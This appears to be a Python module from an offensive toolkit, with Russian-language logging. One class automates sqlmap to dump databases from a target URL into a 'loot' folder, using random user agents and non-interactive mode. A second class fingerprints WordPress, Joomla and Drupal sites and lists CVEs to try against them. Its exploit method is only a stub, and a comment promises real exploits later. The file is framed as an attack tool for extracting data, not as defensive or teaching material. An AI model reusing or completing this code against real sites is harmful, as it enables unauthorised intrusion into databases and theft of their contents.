import subprocess, json, os, re, requests
from utils.logger import log

class SQLInjector:
    def __init__(self, url, cookie=None, data=None):
        self.url = url
        self.cookie = cookie
        self.data = data
        self.output_dir = "./loot/sqlmap"

    def run(self, mode='--dump'):
        cmd = [
            'sqlmap', '-u', self.url,
            '--batch', '--random-agent',
            '--output-dir', self.output_dir
        ]
        if self.cookie:
            cmd += ['--cookie', self.cookie]
        if self.data:
            cmd += ['--data', self.data]
        if mode == '--dump':
            cmd += ['--dump']
        elif mode == '--dbs':
            cmd += ['--dbs']
        log(f"[SQLi] Запуск sqlmap: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        log(f"[SQLi] Результат:\n{result.stdout}")
        return result.stdout

class CMSScanner:
    CVE_DB = {
        'wordpress': ['CVE-2023-...','CVE-2022-...'],
        'joomla': ['CVE-2023-23752'],
        'drupal': ['CVE-2018-7600']
    }
    def __init__(self, target_url):
        self.target_url = target_url
        self.cms_type = None

    def detect(self):
        try:
            r = requests.get(self.target_url, timeout=5)
            if 'wp-content' in r.text: self.cms_type = 'wordpress'
            elif 'Joomla' in r.text: self.cms_type = 'joomla'
            elif 'Drupal' in r.text: self.cms_type = 'drupal'
            log(f"[CMS] Обнаружена CMS: {self.cms_type}")
            return self.cms_type
        except Exception as e:
            log(f"[CMS] Ошибка детекта: {e}")
            return None

    def exploit(self):
        if not self.cms_type:
            self.detect()
        if not self.cms_type:
            return
        log(f"[CMS] Эксплойты для {self.cms_type}...")
        # Здесь будут реальные эксплойты под конкретные CVE
        # Пока заглушка: выводим список CVE
        for cve in self.CVE_DB.get(self.cms_type, []):
            log(f"[CMS] Проверка {cve}")
